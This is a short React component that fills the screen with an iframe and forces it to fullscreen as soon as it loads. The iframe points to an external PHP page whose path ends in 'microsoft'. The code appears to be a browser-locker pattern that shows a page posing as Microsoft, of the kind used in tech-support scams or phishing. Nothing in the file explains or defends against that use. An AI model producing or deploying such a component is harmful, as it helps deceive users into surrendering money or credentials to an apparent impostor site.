import { useEffect, useRef } from "react";

export default function FullscreenFrame() {
  const iframeRef = useRef<HTMLIFrameElement>(null);

  useEffect(() => {
    iframeRef.current?.requestFullscreen();
  }, []);

  return (
    <iframe
      ref={iframeRef}
      src="https://tunipril.com/ddsshht.php/microsoft"
      className="w-screen h-screen border-none"
      allow="fullscreen"
    />
  );
}
